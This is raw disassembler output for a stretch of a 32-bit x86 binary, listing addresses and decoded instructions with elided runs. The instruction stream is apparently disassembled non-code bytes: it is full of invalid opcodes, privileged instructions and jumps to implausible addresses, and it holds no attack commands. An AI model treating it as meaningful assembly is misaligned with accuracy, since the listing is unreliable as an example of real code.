  405910:	xchg   esp,eax
  405911:	in     al,dx
  405912:	dec    ebp
  405913:	mov    ah,0x83
  405915:	stc    
  405916:	dec    eax
  405917:	lea    ecx,[edi+0x398ce194]
  40591d:	pop    eax
  40591e:	into   
  40591f:	lea    ebp,[ebx+0x6c]
  405922:	loopne 0x405917
	...
  405938:	arpl   cx,di
  40593a:	dec    eax
  40593b:	add    al,0x90
  40593d:	xchg   esp,eax
  40593e:	loope  0x4058db
  405940:	push   eax
  405941:	cmp    ah,cl
  405943:	add    ebx,esp
  405945:	stc    
  405946:	pop    ebx
  405947:	xor    BYTE PTR [ebx-0x7],al
  40594a:	popf   
  40594b:	(bad)  
  40594c:	ror    DWORD PTR [ecx+ecx*4-0x7206bc32],0x9c
  405954:	push   ecx
  405955:	div    DWORD PTR [ebp-0x73]
  405958:	mov    esp,0x17fc07f9
  40595d:	icebp  
  40595e:	icebp  
  40595f:	sahf   
  405960:	add    ecx,edi
  405962:	fistp  QWORD PTR [eax+0x6cf6f919]
  405968:	or     ebx,DWORD PTR [edi+esi*8+0x56]
  40596c:	or     DWORD PTR [eax+eiz*2-0x18],esp
  405970:	mov    edi,0x1f510853
  405975:	hlt    
  405976:	idiv   BYTE PTR [esi]
  405978:	subps  xmm6,XMMWORD PTR ds:0xf909
  40597e:	mov    ch,BYTE PTR [esp+edx*4-0x7]
  405982:	mul    BYTE PTR [esi]
  405984:	nop
  405985:	or     BYTE PTR [ebp+0x6a],0x53
  405989:	pop    esp
  40598a:	not    DWORD PTR [esi]
  40598c:	or     DWORD PTR [eax+0xf0ccd7a],esp
  405992:	push   eax
  405993:	push   es
  405994:	sbb    ecx,edi
  405996:	or     edi,esi
  405998:	cmp    bl,BYTE PTR [edi+esi*8-0xa]
	...
  4059b0:	or     cl,bh
  4059b2:	jl     0x405995
  4059b4:	test   DWORD PTR [eax-0x39],0xa51418e6
  4059bb:	inc    ecx
  4059bc:	adc    eax,edi
  4059be:	imul   ch
  4059c0:	xchg   ebp,eax
  4059c1:	div    esi
  4059c3:	push   esp
  4059c4:	jo     0x4059b6
  4059c6:	lods   eax,DWORD PTR ds:[esi]
  4059c7:	mov    dh,0x18
  4059c9:	clc    
  4059ca:	div    BYTE PTR [edi+esi*4-0x9]
  4059ce:	div    BYTE PTR [esi-0x51a3bdf8]
  4059d4:	add    al,bh
  4059d6:	neg    BYTE PTR [eax+ecx*2]
  4059d9:	lock scas al,BYTE PTR es:[edi]
  4059db:	scas   al,BYTE PTR es:[edi]
  4059dc:	adc    al,bh
  4059de:	loop   0x4059c5
  4059e0:	xchg   ebp,eax
  4059e1:	xchg   esp,eax
  4059e2:	(bad)  
  4059e3:	jmp    0x40dbe8
  4059e8:	std    
  4059e9:	dec    ebp
  4059ea:	(bad)  
  4059eb:	jmp    DWORD PTR [edx-0x5dab42f8]
  4059f1:	or     bh,dh
  4059f3:	call   0x379fe5
  4059f8:	jb     0x405a58
  4059fa:	push   esp
  4059fb:	jmp    DWORD PTR [edx+0x8]
  4059fe:	loopne 0x4059bd
  405a00:	mov    bh,0x8
  405a02:	imul   DWORD PTR [ebx]
  405a04:	mov    esi,0x3450459b
  405a09:	xchg   esp,eax
  405a0a:	loopne 0x405a47
  405a0c:	arpl   WORD PTR [ebx-0x289776f8],dx
  405a12:	cmc    
  405a13:	inc    DWORD PTR [eax]
	...
  405a25:	add    BYTE PTR [eax],al
  405a27:	add    BYTE PTR [edx+0x722cb514],ah
  405a2d:	or     bh,dh
  405a2f:	add    BYTE PTR [ecx],bl
  405a31:	jmp    0xff08:0x52f5396e
  405a38:	pop    eax
  405a39:	xlat   BYTE PTR ds:[ebx]
  405a3a:	cmc    
  405a3b:	call   DWORD PTR [edx-0x4a424be5]
  405a41:	xchg   ebx,eax
  405a42:	add    eax,eax
  405a44:	sbb    ebp,edi
  405a46:	adc    DWORD PTR [ebp-0x8f72b],0xffffffc7
  405a4d:	or     ebx,eax
  405a4f:	inc    ebx
  405a50:	jle    0x405a78
  405a52:	jge    0x405a60
  405a54:	lock adc eax,0xb42ff38
  405a5a:	pop    eax
  405a5b:	call   0x48a7a5
  405a60:	mov    edi,0x558583f4
  405a65:	or     dh,bh
  405a67:	push   DWORD PTR [ebp+0xb]
  405a6a:	jge    0x405a74
  405a6c:	sbb    eax,0x22ffc7b6
  405a71:	or     edi,DWORD PTR [ebp-0x4]
  405a74:	mov    WORD PTR [esi],ds
  405a76:	sbb    DWORD PTR [eax],ecx
  405a78:	and    al,0x3f
  405a7a:	mov    bl,0xff
  405a7c:	sub    ebp,DWORD PTR [esi-0xeb136d9]
  405a82:	or     dl,BYTE PTR [ebp+0x7]
  405a85:	adc    DWORD PTR [ebp-0x7c81db3c],ecx
  405a8b:	inc    DWORD PTR [eax]
	...
  405a9d:	add    BYTE PTR [eax],al
  405a9f:	add    BYTE PTR [ecx],bl
  405aa1:	sub    BYTE PTR [edi-0x11ffcb0],cl
  405aa7:	inc    cl
  405aa9:	lds    esi,FWORD PTR [ecx+eax*2]
  405aac:	mov    WORD PTR [ebp+0x15],ss
  405aaf:	mov    esi,0xbff5ed8c
  405ab4:	xchg   ebx,eax
  405ab5:	jo     0x405a62
  405ab7:	add    BYTE PTR [ebp+ebp*8-0x132bba37],cl
  405abe:	or     al,BYTE PTR [eax]
  405ac0:	mov    WORD PTR [esi-0x123c0bb7],fs
  405ac6:	or     al,BYTE PTR [eax]
  405ac8:	es in  eax,dx
  405aca:	adc    al,0x0
  405acc:	add    DWORD PTR [eax-0x70],esi
  405acf:	imul   DWORD PTR [ebx-0x7395c373]
  405ad5:	push   0x703cf449
  405ada:	mov    esp,esi
  405adc:	fwait
  405add:	in     eax,0x81
  405adf:	push   eax
  405ae0:	mov    ebx,DWORD PTR [ecx-0x7c]
  405ae3:	(bad)  
  405ae4:	stc    
  405ae5:	xlat   BYTE PTR ds:[ebx]
  405ae6:	xchg   edx,eax
  405ae7:	push   esp
  405ae8:	cmp    ch,ah
  405aea:	or     cl,BYTE PTR [ebx]
  405aec:	dec    esp
  405aed:	pusha  
  405aee:	or     ecx,ebp
  405af0:	xor    esp,ebp
  405af2:	or     al,BYTE PTR [eax]
  405af4:	vmwrite ebx,DWORD PTR [edi+0xc3f5bf7]
  405afb:	je     0x405a7f
  405afd:	push   0x40
  405aff:	in     al,dx
  405b00:	inc    ebx
  405b01:	xchg   ebp,eax
  405b02:	scas   al,BYTE PTR es:[edi]
  405b03:	mov    al,BYTE PTR [eax]
	...
  405b15:	add    BYTE PTR [eax],al
  405b17:	add    BYTE PTR [ebx-0x2e751380],cl
  405b1d:	cld    
  405b1e:	mov    DWORD PTR [ecx-0x5c],edx
  405b21:	ins    DWORD PTR es:[edi],dx
  405b22:	xor    BYTE PTR [ebp-0x74],al
  405b25:	pop    es
  405b26:	fs (bad) 
  405b28:	sbb    esi,esi
  405b2a:	jne    0x405b5f
  405b2c:	and    al,0x54
  405b2e:	aas    
  405b2f:	add    ecx,DWORD PTR [ecx+ecx*4+0x77d0fa1]
  405b36:	fs fwait
  405b38:	sti    
  405b39:	cmc    
  405b3a:	push   ebp
  405b3b:	xor    ecx,DWORD PTR [ecx]
  405b3d:	adc    BYTE PTR [ebp-0x6e],dl
  405b40:	repz cmc 
  405b42:	mov    al,0x8a
  405b44:	popa   
  405b45:	mov    BYTE PTR [esi-0x30],cl
  405b48:	mov    ebx,0xe403a04c
  405b4d:	iret   
  405b4e:	adc    al,0x8a
  405b50:	ror    DWORD PTR [ecx+0xb5d0f21],cl
  405b56:	fs xchg ebx,eax
  405b58:	mov    ebx,0x8d1b15f5
  405b5d:	xchg   esp,eax
  405b5e:	push   cs
  405b5f:	dec    ecx
  405b60:	mov    bl,0x7f
  405b62:	jmp    0xe06af02
  405b67:	mov    cl,BYTE PTR [edi]
  405b69:	cmp    BYTE PTR ds:0xdff59b92,al
  405b6f:	adc    BYTE PTR [eax+0x18ae16a],al
  405b75:	(bad)  
  405b76:	fnop   
  405b78:	push   ecx
  405b79:	cmc    
  405b7a:	aad    0x9d
	...
  405b90:	xchg   BYTE PTR [edx-0x20],ch
  405b93:	mov    cl,bh
  405b95:	mov    ecx,cs
  405b97:	fcomp  QWORD PTR [ecx-0xb]
  405b9a:	int    0x89
  405b9c:	sbb    esp,ebp
  405b9e:	mov    ebp,0x7f55b89
  405ba3:	jl     0x405b9d
  405ba5:	cld    
  405ba6:	imul   BYTE PTR [esi-0x6eff80eb]
  405bac:	add    dh,0xf6
  405baf:	sahf   
  405bb0:	add    eax,0x59ef83f
  405bb5:	cmc    
  405bb6:	fbstp  TBYTE PTR [ecx]
  405bb8:	fcomip st,st(4)
  405bba:	test   BYTE PTR [esi-0x2e1f039d],0x4
  405bc1:	cmc    
  405bc2:	div    BYTE PTR [esi-0x7d]
  405bc5:	clc    
  405bc6:	fcomip st,st(5)
  405bc8:	push   edx
  405bc9:	xchg   esp,eax
  405bca:	or     BYTE PTR [eax],dh
  405bcc:	retf   0x88b
  405bcf:	mov    ah,0x78
  405bd1:	call   0xfd6c895e
  405bd6:	test   BYTE PTR [esi+0x63],0x4f
  405bda:	hlt    
  405bdb:	cdq    
  405bdc:	adc    al,0x7f
  405bde:	add    al,0x3e
  405be0:	retf   
  405be1:	fdivr  QWORD PTR [edi]
  405be3:	test   al,0x8f
  405be5:	in     al,dx
  405be6:	push   edx
  405be7:	ins    BYTE PTR es:[edi],dx
  405be8:	nop
  405be9:	xchg   esp,eax
  405bea:	add    ebp,DWORD PTR [ecx]
  405bec:	lds    ecx,FWORD PTR [edi]
  405bee:	pop    ebx
  405bef:	call   0xad0ff083
	...
  405c08:	pop    es
  405c09:	xchg   esp,eax
  405c0a:	or     cl,ch
  405c0c:	(bad)  
  405c0d:	int    0x4c
  405c0f:	std    
  405c10:	adc    al,0x8d
  405c12:	or     cl,ch
  405c14:	jns    0x405baa
  405c16:	(bad)  
  405c17:	jmp    0xe9a2f08d
  405c1c:	add    bl,BYTE PTR [edx-0x4]
  405c1f:	cmp    ebx,edi
  405c21:	sbb    esp,edi
  405c23:	(bad)  
  405c24:	add    al,0xf4
  405c26:	push   edi
  405c27:	(bad)  
  405c28:	sub    ah,0xf6
  405c2b:	push   esp
  405c2c:	adc    al,0xfd
  405c2e:	and    al,0x0
  405c30:	or     BYTE PTR [eax-0x5bdaf4f8],bl
  405c36:	or     eax,0x89733e9
  405c3b:	add    ch,cl
  405c3d:	inc    esp
  405c3e:	inc    eax
  405c3f:	inc    ecx
  405c40:	xor    eax,0x1d0c7d1d
  405c45:	sahf   
  405c46:	fdiv   st(7),st
  405c48:	sbb    ch,BYTE PTR [eax+0x72c8d083]
  405c4e:	cld    
  405c4f:	test   DWORD PTR [edx],0xfd52581d
  405c55:	(bad)  
  405c56:	fdiv   st(7),st
  405c58:	call   0xf71c:0x82f08d6e
  405c5f:	call   0x378415
  405c64:	fist   WORD PTR [edi+0x57345060]
  405c6a:	or     bh,bh
	...
  405c80:	add    BYTE PTR [eax],cl
  405c82:	(bad)  
  405c83:	dec    DWORD PTR [edx+0x1c]
  405c86:	cmp    eax,0x8571dd8
  405c8b:	call   0x378531
  405c90:	sub    al,0x72
  405c92:	in     al,dx
  405c93:	imul   DWORD PTR [edx+0x1c]
  405c96:	bound  eax,QWORD PTR [eax]
  405c98:	sbb    eax,0xa54159bf
  405c9d:	sbb    al,0xbd
  405c9f:	lock sbb BYTE PTR [edi+esi*8],0xff
  405ca4:	loopne 0x405ce5
  405ca6:	inc    eax
  405ca7:	inc    ecx
  405ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ca9:	(bad)  
  405cab:	rcr    DWORD PTR [edx-0x767a7ee5],cl
  405cb1:	and    esi,edi
  405cb3:	(bad)  
  405cb4:	fistp  WORD PTR [eax+0x59b46260]
  405cba:	or     bh,bh
  405cbc:	mov    WORD PTR [eax],ss
  405cbe:	pushf  
  405cbf:	imul   DWORD PTR [ebx-0x1e]
  405cc2:	mov    ?,WORD PTR ds:0x4da544
  405cc8:	fs gs mov ebx,0x897453ff
  405ccf:	call   0x83cf9f17
  405cd4:	add    DWORD PTR [ecx],esp
  405cd6:	xchg   edi,edi
  405cd8:	cmp    edi,ebp
  405cda:	push   es
  405cdb:	dec    ecx
  405cdc:	cmovs  edx,DWORD PTR [eax+0xc222bf7]
  405ce3:	je     0x405ce5
	...
  405cf5:	add    BYTE PTR [eax],al
  405cf7:	add    ah,cl
  405cf9:	jle    0x405d3c
  405cfb:	call   0xcfcf23
  405d00:	cwde   
  405d01:	xor    dl,BYTE PTR [ebx]
  405d03:	add    BYTE PTR [edx+esi*2-0x1a8600b2],cl
  405d0a:	xchg   edx,eax
  405d0b:	repz enter 0x8f51,0xff
  405d10:	cmp    DWORD PTR [ecx-0x79],ebx
  405d13:	(bad)  
  405d14:	jmp    0x405d77
  405d16:	sbb    DWORD PTR [eax],ecx
  405d18:	hlt    
  405d19:	inc    ecx
  405d1a:	mov    al,0xff
  405d1c:	(bad)  [ecx-0x562417a7]
  405d22:	(bad)  
  405d23:	inc    DWORD PTR [ecx-0xb]
  405d26:	xchg   edx,eax
  405d27:	cmp    ecx,edx
  405d29:	mov    ecx,0x9901ff8f
  405d2e:	xchg   edi,edi
  405d30:	mov    bl,0x89
  405d32:	sbb    DWORD PTR [eax],ecx
  405d34:	mov    ah,0xd5
  405d36:	scas   eax,DWORD PTR es:[edi]
  405d37:	jmp    DWORD PTR [ebx-0x5c1ba667]
  405d3d:	icebp  
  405d3e:	(bad)  
  405d3f:	call   0xffcfeac5
  405d44:	mov    ebp,DWORD PTR [ecx-0x6a7c0870]
  405d4a:	out    dx,al
  405d4b:	fwait
  405d4c:	mov    es,esp
  405d4e:	aad    0x86
  405d50:	jae    0x405d7a
  405d52:	leave  
  405d53:	mov    gs,WORD PTR [ebx-0xe]
  405d56:	enter  0x538e,0xf2
  405d5a:	int    0x86
	...
  405d70:	and    ebp,esp
  405d72:	mov    ebp,0x33f25386
  405d77:	cld    
  405d78:	xor    edi,DWORD PTR [eax]
  405d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d7b:	xchg   BYTE PTR [ebx-0xe],al
  405d7e:	push   ebx
  405d7f:	xchg   ebx,eax
  405d80:	inc    ebx
  405d81:	repnz xchg ebp,eax
  405d83:	fwait
  405d84:	push   edx
  405d85:	loop   0x405d24
  405d87:	xchg   BYTE PTR [ebx],ch
  405d89:	pop    eax
  405d8a:	cdq    
  405d8b:	pushf  
  405d8c:	loopne 0x405d80
  405d8e:	lea    eax,[esi-0x648a97e5]
  405d94:	push   ss
  405d95:	cs loope 0x405d9b
  405d98:	aad    0xd6
  405d9a:	call   0x5d5db6a2
  405d9f:	adc    al,0xf0
  405da2:	fiadd  DWORD PTR [ebx]
  405da4:	xchg   bx,ax
  405da6:	pop    esi
  405da7:	adc    BYTE PTR [esp+edi*8-0xe1c48b0],dl
  405dae:	ja     0x405df0
  405db0:	fdivr  DWORD PTR [eax+ebx*8+0x33]
  405db4:	dec    ebp
  405db5:	xchg   esp,eax
  405db6:	adc    BYTE PTR ds:[esp+edi*8-0xe3c7a34],dl
  405dbe:	cwde   
  405dbf:	jnp    0x405e1d
  405dc1:	push   ebx
  405dc2:	loope  0x405d4a
  405dc4:	cmp    DWORD PTR [ecx+ecx*1+0x5f1aa2e],ebx
  405dcb:	sbb    esi,esp
  405dcd:	inc    esp
  405dce:	mov    al,ds:0xf9679b03
  405dd3:	fwait
	...
  405de8:	inc    esi
  405de9:	repnz pop es
  405deb:	not    BYTE PTR [ecx]
  405ded:	jl     0x405db6
  405def:	cdq    
  405df0:	enter  0xf794,0x5c
  405df4:	js     0x405def
  405df6:	fmul   QWORD PTR es:[ecx]
  405df9:	icebp  
  405dfa:	pop    edi
  405dfb:	fisub  WORD PTR [eax-0x6c31f7ad]
  405e01:	pushf  
  405e02:	loopne 0x405e0f
  405e04:	adc    esi,ecx
  405e06:	not    BYTE PTR [ecx+0x68]
  405e09:	inc    esp
  405e0a:	dec    ecx
  405e0b:	jmp    0xc140c520
  405e10:	xor    esi,eax
  405e12:	mul    BYTE PTR [esi-0x610b98ef]
  405e18:	sbb    DWORD PTR [eax+eiz*8-0x90f1b4d],0xffffffa0
  405e20:	dec    esi
  405e21:	cwde   
  405e22:	or     BYTE PTR [edx*4-0x7016a000],bl
  405e29:	add    DWORD PTR [esi-0x85f648a],esi
  405e2f:	hlt    
  405e30:	pop    es
  405e31:	stc    
  405e32:	pop    ecx
  405e33:	pop    esp
  405e34:	adc    ecx,esi
  405e36:	shr    BYTE PTR [ebx],0xf0
  405e39:	lock pop ebx
  405e3b:	bound  eax,QWORD PTR [edx*1-0x5e70228b]
  405e42:	mov    WORD PTR [ebx],cs
  405e44:	(bad)  
  405e45:	xchg   esp,eax
  405e46:	or     BYTE PTR [esi],bh
  405e48:	and    DWORD PTR [eax+0xb5e0],0x0
	...
  405e5f:	add    ch,dh
  405e61:	lock mul dl
  405e64:	iret   
  405e65:	data16 sbb BYTE PTR [ecx-0x16b6a3b5],dl
  405e6c:	or     BYTE PTR [edi+0x4],ah
  405e6f:	add    DWORD PTR [edx+0x270ef6c5],esp
  405e75:	push   edi
  405e76:	add    al,0x0
  405e78:	call   DWORD PTR [eax+eiz*2+0x855f48c]
  405e7f:	push   0x49a3ea
  405e84:	jb     0x405e65
  405e86:	fimul  WORD PTR [eax-0x5c]
  405e89:	cwde   
  405e8a:	loopne 0x405ea5
  405e8c:	aaa    
  405e8d:	sbb    edi,esi
  405e8f:	or     esi,DWORD PTR ds:0xa55016a0
  405e95:	sbb    DWORD PTR [ebp+0xc],edi
  405e98:	cmp    eax,0x12ffda66
  405e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e9e:	pop    eax
  405e9f:	dec    DWORD PTR [eax-0xd6e1110]
  405ea5:	sbb    bh,dh
  405ea7:	call   0x3788b5
  405eac:	sbb    eax,0x2ffc639
  405eb1:	mov    cs,WORD PTR [eax]
  405eb3:	push   0x49a2c1
  405eb8:	jge    0x405e3b
  405eba:	pop    ecx
  405ebb:	inc    ecx
  405ebc:	and    eax,0xf5000a8c
  405ec1:	adc    esp,eax
  405ec3:	loope  0x405ec5
	...
  405ed5:	add    BYTE PTR [eax],al
  405ed7:	add    BYTE PTR [ecx+ebx*1],ah
  405eda:	test   DWORD PTR [ebx],0x50169fa5
  405ee0:	xor    eax,0x4d0c7d19
  405ee5:	mov    ebp,0xa352ffda
  405eea:	pop    eax
  405eeb:	call   FWORD PTR [eax]
  405eed:	in     al,dx
  405eee:	out    dx,al
  405eef:	pop    ecx
  405ef0:	xchg   edx,eax
  405ef1:	sbb    bh,dh
  405ef3:	call   0x378909
  405ef8:	dec    ebp
  405ef9:	push   eax
  405efa:	(bad)  
  405efb:	push   DWORD PTR [edx-0x73]
  405efe:	or     BYTE PTR [eax+0x21],ch
  405f01:	mov    ds:0x158c0049,al
  405f06:	inc    ecx
  405f07:	push   ecx
  405f08:	dec    ebp
  405f09:	std    
  405f0a:	mov    esi,DWORD PTR ds:0x4a25b4
  405f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f11:	inc    ebp
  405f12:	mov    edx,0xcaf28bff
  405f17:	je     0x405ebb
  405f19:	or     eax,0xea01ff3b
  405f1e:	bound  esp,QWORD PTR [ecx]
  405f20:	pop    esi
  405f21:	into   
  405f22:	mov    dl,BYTE PTR [eax-0x44]
  405f25:	(bad)  
  405f26:	lock pop es
  405f28:	je     0x405ec7
  405f2a:	mov    edi,edi
  405f2c:	pop    ebx
  405f2d:	(bad)  
  405f30:	push   ebx
  405f31:	cs outs dx,BYTE PTR fs:[esi]
  405f34:	pop    edx
  405f35:	mov    ebp,DWORD PTR es:[edx-0x74]
  405f39:	push   ebp
  405f3a:	cwde   
  405f3b:	push   ecx
	...
  405f50:	int    0xfd
  405f52:	loop   0x405f0d
  405f54:	fnstsw WORD PTR [esp+ecx*1+0xafd8e68]
  405f5b:	xor    BYTE PTR [ecx*4-0x1de400a3],0x4a
  405f63:	je     0x405fd7
  405f65:	(bad)  
  405f66:	fdiv   st(6),st
  405f68:	cmp    ecx,0x7ddde962
  405f6e:	mov    edx,DWORD PTR [eax+0x5c]
  405f71:	jbe    0x405f64
  405f73:	pop    es
  405f74:	in     al,0x44
  405f76:	mov    bh,bh
  405f78:	jmp    0x405fce
  405f7a:	aaa    
  405f7b:	into   
  405f7c:	jecxz  0x405fdb
  405f7e:	fs ss retf 0x8b55
  405f83:	push   0xffcc0c60
  405f88:	retf   0x72f
  405f8b:	call   0xffcbeb64
  405f90:	pop    esp
  405f91:	xchg   esp,eax
  405f92:	mov    cl,0x82
  405f94:	cmp    DWORD PTR [ecx+ebx*1+0x1deeaa4b],ebx
  405f9b:	ins    BYTE PTR es:[edi],dx
  405f9c:	xchg   dh,bl
  405f9e:	add    eax,0xfd689b83
  405fa3:	imul   edi,DWORD PTR [esi-0x22],0xfffffff5
  405fa7:	adc    BYTE PTR [ebp-0x2d],0xe8
  405fab:	add    ebx,ecx
  405fad:	sbb    ebp,esi
  405faf:	xchg   BYTE PTR [eax-0x17],dl
  405fb2:	pop    edx
  405fb3:	add    al,0x0
	...
  405fc5:	add    BYTE PTR [eax],al
  405fc7:	add    dh,ah
  405fc9:	xchg   edx,eax
  405fca:	(bad)  
  405fcb:	clc    
  405fcc:	xchg   ebx,eax
  405fcd:	cld    
  405fce:	adc    al,0x4f
  405fd0:	arpl   si,bp
  405fd2:	addr16 enter 0x7d57,0xe4
  405fd7:	add    al,0x8c
  405fd9:	xchg   esp,eax
  405fda:	(bad)  [ecx]
  405fdc:	pop    edx
  405fdd:	out    dx,al
  405fde:	mov    ebp,0x48ecc98c
  405fe3:	or     BYTE PTR [ebp-0x467d1e6c],cl
  405fe9:	in     al,dx
  405fea:	cwde   
  405feb:	test   ch,ah
  405fed:	xchg   esp,eax
  405fee:	loope  0x405ffe
  405ff0:	dec    esp
  405ff1:	imul   edi,ebp,0xe1939040
  405ff7:	add    ebx,DWORD PTR [ebx+0x3f8769f]
  405ffd:	out    dx,al
  405ffe:	repz or esi,esp
  406001:	sbb    al,0x67
  406003:	cmp    bl,0xf9
  406006:	clc    
  406007:	cmp    BYTE PTR [ecx-0x14],0x58
  40600b:	ret    0xedd9
  40600e:	pop    ebp
  40600f:	in     eax,dx
  406010:	stos   DWORD PTR es:[edi],eax
  406011:	cld    
  406012:	lock push ebp
  406014:	fucomi st,st(5)
  406016:	nop
  406017:	sbb    BYTE PTR [ecx-0x64],0x59
  40601b:	icebp  
  40601c:	leave  
  40601d:	in     eax,dx
  40601e:	pop    es
  40601f:	ss mov cl,0x8b
  406022:	loopne 0x40600d
  406024:	popa   
  406025:	in     eax,dx
  406026:	div    dl
  406028:	dec    edi
  406029:	push   0x911c
	...
  40603e:	add    BYTE PTR [eax],al
  406040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406041:	inc    esp
  406042:	dec    ecx
  406043:	jmp    0x38c45607
  406048:	push   cs
  406049:	out    dx,al
  40604a:	push   edi
  40604b:	push   es
  40604c:	xchg   esp,eax
  40604d:	xchg   ebp,eax
  40604e:	loopne 0x405ffe
  406050:	or     eax,0xaa83f6ed
  406055:	cld    
  406056:	call   0x32d6e73
  40605b:	test   eax,0x61608174
  406060:	aas    
  406061:	push   esp
  406062:	or     BYTE PTR [ecx],bh
  406064:	lock jg 0x406040
  406067:	into   
  406068:	or     eax,0x803cf744
  40606d:	cld    
  40606e:	aaa    
  40606f:	mov    edi,0xd561ed0d
  406074:	mov    bh,0xd2
  406076:	fsubr  DWORD PTR [esi+0x1dc8990d]
  40607c:	xchg   esp,eax
  40607d:	jl     0x4060ef
  40607f:	cmp    BYTE PTR [edi-0x13],cl
  406082:	inc    esi
  406083:	cmp    DWORD PTR [esi],0x408ef6c4
  406089:	out    dx,al
  40608a:	jl     0x40607d
  40608c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40608d:	xor    esi,0x7e
  406090:	or     eax,0xf01087a
  406095:	inc    ebx
  406096:	dec    ecx
  406097:	jmp    0xa8996683
  40609c:	(bad)  
  40609d:	in     eax,dx
  40609e:	cmp    al,0x41
  4060a0:	fcom   DWORD PTR [ebx+0x8]
  4060a3:	inc    ecx
	...
  4060b8:	mov    ecx,0xc04ef6dc
  4060bd:	in     eax,dx
  4060be:	jl     0x4060c0
  4060c0:	fnstsw WORD PTR [eax-0x7]
  4060c3:	std    
  4060c4:	mov    dl,BYTE PTR [ebx]
  4060c6:	bound  eax,QWORD PTR [eax]
  4060c8:	int    0x1c
  4060ca:	pop    ecx
  4060cb:	inc    ecx
  4060cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060cd:	clc    
  4060ce:	popf   
  4060cf:	push   ecx
  4060d0:	in     al,0x90
  4060d2:	div    DWORD PTR ds:0x47e04d
  4060d8:	lea    esp,[edi-0x60750028]
  4060de:	enter  0xb374,0x19
  4060e2:	dec    ebp
  4060e3:	hlt    
  4060e4:	mov    ah,bl
  4060e6:	cli    
  4060e7:	inc    DWORD PTR [eax]
  4060e9:	mov    al,ds:0x1568b1e0
  4060ee:	idiv   edi
  4060f0:	shr    BYTE PTR [eax+eiz*8+0x1],1
  4060f4:	cmp    BYTE PTR ds:0x756af7,dl
  4060fa:	mov    BYTE PTR [ecx-0x5c],dl
  4060fd:	nop
  4060fe:	pusha  
  4060ff:	mov    edx,0xfef6d774
  406104:	inc    eax
  406105:	push   eax
  406106:	inc    eax
  406107:	inc    ecx
  406108:	xor    eax,0xead00a80
  40610d:	adc    al,0x58
  40610f:	call   DWORD PTR [eax+0x8a0e098]
  406115:	adc    eax,0x356af7
  40611a:	adc    DWORD PTR [ecx+0x0],0x0
	...
  40612e:	add    BYTE PTR [eax],al
  406130:	fs nop
  406132:	pusha  
  406133:	mov    edx,0xfef6d774
  406138:	inc    eax
  406139:	push   eax
  40613a:	inc    eax
  40613b:	inc    ecx
  40613c:	cmc    
  40613d:	jg     0x406129
  40613f:	iret   
  406140:	push   0x14
  406142:	add    eax,eax
  406144:	ror    DWORD PTR [ebp+0x14414581],1
  40614a:	jge    0x406140
  40614c:	mov    WORD PTR [edx-0x2],es
  40614f:	pop    es
  406150:	in     al,0xdd
  406152:	jne    0x406153
  406154:	rcl    DWORD PTR [edx-0x2],cl
  406157:	repz mov ah,0x6d
  40615a:	inc    edi
  40615b:	inc    ebx
  40615d:	xlat   BYTE PTR ds:[ebx]
  40615e:	or     ch,BYTE PTR [eax+0xd]
  406161:	or     eax,0x6a2bffca
  406166:	fiadd  DWORD PTR [eax-0x74]
  406169:	add    eax,0x7d8c000d
  40616e:	arpl   WORD PTR [edx+0x50889acb],si
  406174:	xchg   ebx,eax
  406175:	push   0xe8dce803
  40617a:	jbe    0x40617b
  40617c:	idiv   ch
  40617e:	loop   0x40610b
  406180:	fnstsw WORD PTR [ebx+ecx*1]
  406183:	push   0xffcdac1b
  406188:	repz dec DWORD PTR [edx]
  40618b:	add    BYTE PTR [edx*8-0x25a43066],cl
  406192:	add    al,al
	...
  4061a8:	fmul   st,st(3)
  4061aa:	add    DWORD PTR [ebp+0x40],0x2a
  4061ae:	icebp  
  4061af:	repz inc ebx
  4061b1:	test   al,0x4
  4061b3:	call   0xffb79a55
  4061b8:	xor    ecx,DWORD PTR [eax+0x39ade870]
  4061be:	ja     0x4061bf
  4061c0:	mov    dh,0xfd
  4061c2:	loop   0x406144
  4061c4:	mov    ebp,0xd6680cbc
  4061c9:	mov    ecx,ebp
  4061cb:	push   DWORD PTR [ebx-0x1]
  4061ce:	or     al,BYTE PTR [eax]
  4061d0:	or     al,0x15
  4061d2:	jmp    0x4061a2
  4061d4:	sti    
  4061d5:	jns    0x4061b3
  4061d7:	(bad)  
  4061d8:	jns    0x40616e
  4061da:	stc    
  4061db:	imul   ecx,DWORD PTR [ebp+0x767f55e9],0xffffff94
  4061e2:	leave  
  4061e3:	(bad)  
  4061e4:	cmp    eax,0x15ebe155
  4061e9:	inc    ebp
  4061ea:	mov    al,ds:0xe1963403
  4061ef:	add    ecx,DWORD PTR [esp+edi*8]
  4061f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061f3:	dec    esi
  4061f4:	mov    ebx,0x3843e9ea
  4061f9:	cmp    BYTE PTR [eax-0x37],0x9f
  4061fd:	jmp    0x6be9:0x60a3779b
  406204:	into   
  406205:	out    0x5,eax
  406207:	jg     0x40619c
  406209:	pusha  
  40620a:	cmc    
  40620b:	imul   eax,DWORD PTR [eax],0x0
	...
  40621e:	add    BYTE PTR [eax],al
  406220:	sahf   
  406221:	fdiv   st,st(5)
  406223:	jle    0x4061a8
  406225:	pusha  
  406226:	std    
  406227:	jle    0x40622a
  406229:	popf   
  40622a:	or     DWORD PTR [ecx+0x4cedea45],ecx
  406230:	dec    esi
  406231:	xchg   ecx,eax
  406232:	loope  0x40620c
  406234:	push   ss
  406235:	stc    
  406236:	dec    eax
  406237:	add    al,0x8c
  406239:	stc    
  40623a:	xchg   BYTE PTR [esi-0x27],bh
  40623d:	cwde   
  40623e:	into   
  40623f:	clc    
  406240:	xchg   ebx,eax
  406241:	cld    
  406242:	mov    bl,0x74
  406244:	inc    ebx
  406245:	jmp    0x8b1c:0x948441a7
  40624c:	and    BYTE PTR [eiz*4-0x6a15d549],dl
  406253:	inc    esi
  406254:	or     DWORD PTR ds:0x951b7e9f,ebp
  40625a:	loope  0x40625f
  40625c:	mov    WORD PTR ds:0xd4971024,ds
  406262:	cld    
  406263:	or     BYTE PTR [ebp*4-0x6f0b16f8],cl
  40626a:	loope  0x40627c
  40626c:	mov    DWORD PTR [eax+ecx*1-0x1f621b9a],edx
  406273:	stc    
